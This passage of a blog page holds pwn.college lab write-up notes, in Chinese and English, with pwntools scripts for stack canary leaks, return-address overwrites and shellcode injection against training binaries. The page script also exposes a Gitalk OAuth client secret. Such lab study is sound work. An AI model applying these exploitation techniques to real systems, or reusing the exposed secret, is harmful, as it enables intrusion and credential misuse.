<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    p = process(<span class="hljs-string">&#x27;./babymem_level12.1.elf64&#x27;</span>)<br><br>    p.sendline(<span class="hljs-string">b&#x27;25&#x27;</span>)<br>    pl = <span class="hljs-string">b&#x27;REPEAT&#x27;</span>.rjust(<span class="hljs-number">0x20</span>-<span class="hljs-number">8</span>+<span class="hljs-number">1</span>)<br>    p.sendline(pl)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>    canary = p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(canary)<br>    p.sendline(<span class="hljs-string">b&#x27;42&#x27;</span>)<br>    pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;\xa4\x23&#x27;</span><br>    p.sendline(pl)                             <br><br>    <span class="hljs-built_in">all</span> = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">all</span>)<br>        <span class="hljs-keyword">break</span>	<span class="hljs-comment">#一直试到成功为止.</span><br>    <span class="hljs-comment">#break</span><br></code></pre></div></td></tr></table></figure>

<h4 id="level13-1"><a href="#level13-1" class="headerlink" title="level13"></a>level13</h4><p>大满开!</p>
<p>重复利用没有清空的堆栈内容. flag在<code>rbp-0x10f</code>开始的0x100字节上. 所以在challenge栈帧中也从这个位置读取即可. 神奇的是有一大块空间没有被定义. 或许是定义了一个数组然后没有使用? 这样的话还不能被编译器优化掉.</p>
<p>v5从rbp-0x120开始, 填上0x20 byte is enough.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">17</span>                                                    <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/mnt/hgfs/LearingList/pwn.college/input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(<span class="hljs-string">b&#x27;17\n&#x27;</span>+pl)<br></code></pre></div></td></tr></table></figure>
<h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><p>也是leak canary, the problem is printf() function limit the number of bytes to be output to 452, while buf size if 456 bytes. </p>
<p>………….</p>
<h4 id="level15-1"><a href="#level15-1" class="headerlink" title="level15"></a>level15</h4><p>TCP连接, 利用fork的特点来绕过canary.</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">tcp_socket = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>udp_socket = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);<br>raw_socket = socket(AF_INET, SOCK_RAW, protocol);<br></code></pre></div></td></tr></table></figure>

<ul>
<li><a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/tubes/sockets.html">https://docs.pwntools.com/en/stable/tubes/sockets.html</a>, exempli gratia:</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">In [<span class="hljs-number">8</span>]: <span class="hljs-keyword">import</span> pwn <br>   ...:  <br>   ...: pwn.context.encoding = <span class="hljs-string">&quot;latin-1&quot;</span> <br>   ...:  <br>   ...: <span class="hljs-keyword">with</span> pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level15.0&quot;</span>) <span class="hljs-keyword">as</span> target: <br>   ...:     <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote: <br>   ...:         remote.writeafter(<span class="hljs-string">b&quot;Payload size:&quot;</span>, <span class="hljs-string">b&quot;100\n&quot;</span>) <br>   ...:         remote.writeafter(<span class="hljs-string">b&quot;Send your payload&quot;</span>, <span class="hljs-string">b&quot;test&quot;</span>) <br>   ...:         pwn.info(remote.clean().decode()) <br>   ...:                                                                                                                                                       <br>[x] Starting local process <span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span><br>[+] Starting local process <span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span>: pid <span class="hljs-number">7046</span><br>[x] Opening connection to localhost on port <span class="hljs-number">1337</span><br>[x] Opening connection to localhost on port <span class="hljs-number">1337</span>: Trying <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>[+] Opening connection to localhost on port <span class="hljs-number">1337</span>: Done<br>[*]  (up to <span class="hljs-number">100</span> <span class="hljs-built_in">bytes</span>)!<br>    You sent <span class="hljs-number">4</span> <span class="hljs-built_in">bytes</span>!<br>    Let<span class="hljs-string">&#x27;s see what happened with the stack</span><br></code></pre></div></td></tr></table></figure>



<h1 id="module9"><a href="#module9" class="headerlink" title="module9"></a>module9</h1><p>nothing special.</p>
<h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>canary disabled.</p>
<p>inject shellcode to a map region, and then overwrite return address to jmp to executing shellcode.</p>
<h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p>保护全关. 可执行栈. 确实没有什么东西, 没开PIE的话栈的位置都是一样的, shellcode注入的地点也可以使用绝对地址来确定.</p>
<h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h4><img src="../../image/pwn-modules/image-20220430102917561.png" srcset="/img/loading.gif" lazyload alt="image-20220430102917561" style="zoom:80%;" />

<p>栈上的地址最低12位都是随机的. 怕不是每次运行的时候_start和__libc_start_main函数都会用到不同的栈空间大小…也许是aslr把stackbase也改了.<br>这下子只能连rbp都给leak出来了.</p>
<ol>
<li>first exec <code>challenge</code> to <strong>leak canary</strong> and inject <strong>shellcode</strong>.</li>
<li>second exec to leak first challenge’s <strong>rbp</strong>, and then calc the shellcode position.</li>
<li>third exec to jmp to shellcode.</li>
</ol>
<p><del>不对, 第一次leak canary的时候也可以leak出main的rbp,</del> 没事了, main的rbp可以用但没必要.</p>
<ul>
<li>没有push imm64这条指令.</li>
<li>一开始用chmod+.ascii “flag”的做法, 发现自己加了一个空字符, 只能通过栈来尝试. 想了想, 栈指针加8也不会对第一个challenge的栈帧造成什么影响. 换成下面这个, 注意小端法.<br><code>[hex(ord(character)) for character in &#39;/flag&#39;] =&gt; [&#39;0x2f&#39;, &#39;0x66&#39;, &#39;0x6c&#39;, &#39;0x61&#39;, &#39;0x67&#39;]</code> </li>
<li>没料到手写shellcode会有一堆的空字符. 放弃手写, 转为pwntool生成.</li>
<li>size写太大, REPEAT后面的换行符都给读进去了.</li>
<li>招架不住canary和rbp里面也有空字符…多试几次就行了</li>
<li>IDA变量定义错了, 存在一个指向字符数组的指针, read参数还出现了对buf的解引用, 半天没看出来.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#buf在rbp-0x38的位置, canary在rbp-0x8</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#binary = glob(&quot;/challenge/t*&quot;)[0]</span><br>binary = <span class="hljs-string">&quot;./toddlerone_level3.1.elf64&quot;</span><br>context.binary = binary<br>p = process(binary) <br><br><span class="hljs-comment">#第一次leak canary</span><br>p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;57&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;bytes)!\n&quot;</span>)<br>shellcode=shellcraft.amd64.chmod(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;0x04&#x27;</span>)<br>payload = asm(shellcode) <br>payload = payload.ljust(<span class="hljs-number">0x40</span>-<span class="hljs-number">8</span>-<span class="hljs-number">6</span>+<span class="hljs-number">1</span>)<br>payload += <span class="hljs-string">b&#x27;REPEAT&#x27;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>canary = p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;canary&#x27;</span>+canary)<br><br><span class="hljs-comment">#第二次leak rbp</span><br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-string">b&#x27;64&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x40</span>-<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;REPEAT&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;REPEAT&#x27;</span>)<br>rbp_byte = p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>rbp = <span class="hljs-built_in">int</span>.from_bytes(rbp_byte, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;rbp = &#x27;</span>+<span class="hljs-built_in">hex</span>(rbp))<br><br><span class="hljs-comment">#第三次执行shellcode.</span><br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-string">b&#x27;200&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x38</span>+canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(rbp-<span class="hljs-number">0x40</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br></code></pre></div></td></tr></table></figure>

<h4 id="level4-2"><a href="#level4-2" class="headerlink" title="level4"></a>level4</h4>
            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/PWN/">PWN</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/PWN/">PWN</a>
                    
                  </div>
                
              </div>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022-03/Now-CSCD70/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">CSCD70 && LLVM</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022-01/Learning-Computer-Networking/">
                        <span class="hidden-mobile">Computer Networking</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="gitalk-container"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#gitalk-container', function() {
      Fluid.utils.createCssLink('/css/gitalk.css')
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', function() {
        var options = Object.assign(
          {"clientID":"312db7ebbc085de5d28d","clientSecret":"85ea3cefd13c73a6d85c1813adfde4f1550bfbda","repo":"yogdzewa.github.io","owner":"yogdzewa","admin":["yogdzewa"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
          {
            id: '5a166c11dfbe42a6f7e9e0bfe442b757'
          }
        )
        var gitalk = new Gitalk(options);
        gitalk.render('gitalk-container');
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
        typing(title);
      
    })(window, document);
  </script>









  <script  src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js" ></script>
  <script>
    if (window.mermaid) {
      mermaid.initialize({"theme":"default"});
    }
  </script>







<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
